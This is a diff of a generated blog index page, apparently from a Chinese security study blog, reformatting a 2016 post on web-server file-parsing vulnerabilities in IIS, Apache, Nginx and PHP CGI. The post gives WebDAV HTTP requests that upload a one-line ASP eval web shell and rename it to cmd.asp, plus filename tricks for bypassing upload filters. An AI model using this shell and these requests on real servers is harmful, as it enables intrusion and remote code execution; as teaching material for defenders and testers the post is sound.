@@ -90,30 +90,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>常见Web容器有IIS、Nginx、Apache、Tomcat等```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## **IIS解析漏洞**</div></pre></td></tr></table></figure>
-<p>IIS6.0在解析文件时存在以下两个解析漏洞<br>1、当建立<em>.asp、</em>.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。<br>2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
-<p>WebDav漏洞<br>    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若<br>支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</p>
-<p>测试步骤如下：<br>    1）通过OPTIONS探测服务器所支持的HTTP方法<br>    请求：<br>    OPTIONS / HTTP/1.1<br>    Host: www.xxxx.com<br>    2)通过PUT方法向服务器上传shell<br>    请求：<br>    PUT /a.txt HTTP/1.1<br>    Host: www.xxxx.com<br>    Content-Length: 30</p>
-<pre><code>&lt;%eval request(&quot;chopper&quot;) %&gt;
-3)通过Move或Copy方法改名
-请求：
-COPY /a.txt HTTP/1.1
-Host: www.xxxx.com
-Destination: http://www.xxxx.com/cmd.asp
-4)用DELETE方法删除文件
-请求：
-DELETE /a.txt HTTP/1.1
-Host: www.xxxx.com
-</code></pre><p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Apache解析漏洞*</div></pre></td></tr></table></figure></p>
-<p>在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件”/conf/mime.types”中配置Apache可以识别的文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Nginx解析漏洞*</div></pre></td></tr></table></figure></p>
-<p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *PHP CGI解析漏洞*</div></pre></td></tr></table></figure></p>
+        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>常见Web容器有IIS、Nginx、Apache、Tomcat```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">## **IIS解析漏洞**</div><div class="line">IIS6.0在解析文件时存在以下两个解析漏洞</div><div class="line"></div><div class="line">```1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。</div><div class="line">2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。</div></pre></td></tr></table></figure>
+<p><strong>WebDav漏洞</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">  WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若</div><div class="line">支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</div><div class="line"></div><div class="line">测试步骤如下：</div><div class="line">    1）通过OPTIONS探测服务器所支持的HTTP方法</div><div class="line">    请求：</div><div class="line">    OPTIONS / HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div><div class="line">    2)通过PUT方法向服务器上传shell</div><div class="line">    请求：</div><div class="line">    PUT /a.txt HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div><div class="line">    Content-Length: 30</div><div class="line"></div><div class="line">    &lt;%eval request(&quot;chopper&quot;) %&gt;</div><div class="line">    3)通过Move或Copy方法改名</div><div class="line">    请求：</div><div class="line">    COPY /a.txt HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div><div class="line">    Destination: http://www.xxxx.com/cmd.asp</div><div class="line">    4)用DELETE方法删除文件</div><div class="line">    请求：</div><div class="line">    DELETE /a.txt HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div></pre></td></tr></table></figure></p>
+<p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞</p>
+<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><strong>Apache解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件"/conf/mime.types"中配置Apache可以识别的文件名```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## **Nginx解析漏洞**</div></pre></td></tr></table></figure>
+<p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## **PHP CGI解析漏洞**</div></pre></td></tr></table></figure></p>
 <p>当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问<a href="http://www.xxx.com/x.txt/x.php" target="_blank" rel="external">http://www.xxx.com/x.txt/x.php</a><br>时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析</p>
 <p>IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php<br>Nginx中：任意文件名/任意文件名.php就会被解析为php<br>```</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cirzm0x0y0027uwhro08c575r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cirzmdjt8001xqshrpzti9sg9" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -223,7 +211,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cirzm0wxm000juwhr5a50ztb9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cirzmdjpc0005qshr9b1g6cqm" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -277,7 +265,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cirzm0wza001auwhr3rqyjppc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cirzmdjs4001cqshrfwvn2d7f" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/webshell的获取与查杀/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -323,7 +311,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cirzm0wxc000guwhrprs53ohg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cirzmdjpw000gqshrani1aau6" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/redis漏洞利用/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -371,7 +359,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cirzm0wxw000puwhr05v4i2zx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cirzmdjqg000nqshrgkammrvq" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/redis的安装/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -421,7 +409,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cirzm0ww80001uwhrub0105az" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cirzmdjr0000wqshr22jq5nq7" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -476,7 +464,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cirzm0x18002fuwhrrthosd6y" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cirzmdju2002fqshrd8fn8q3p" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/04/逻辑漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -527,7 +515,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cirzm0x0e001vuwhr11dx5yks" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cirzmdjso001lqshr75cj3xg0" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/01/敏感信息泄露/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -577,7 +565,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/30/文件包含漏洞/" data-id="cirzm0x0o0024uwhra3bvggyx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/30/文件包含漏洞/" data-id="cirzmdjti0023qshrkh4hxi3g" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/30/文件包含漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -636,7 +624,7 @@ Host: www.xxxx.com
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/30/任意代码执行漏洞/" data-id="cirzm0wzu001muwhrx6ker0lh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/30/任意代码执行漏洞/" data-id="cirzmdjsy001rqshrmgnx5t99" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/30/任意代码执行漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
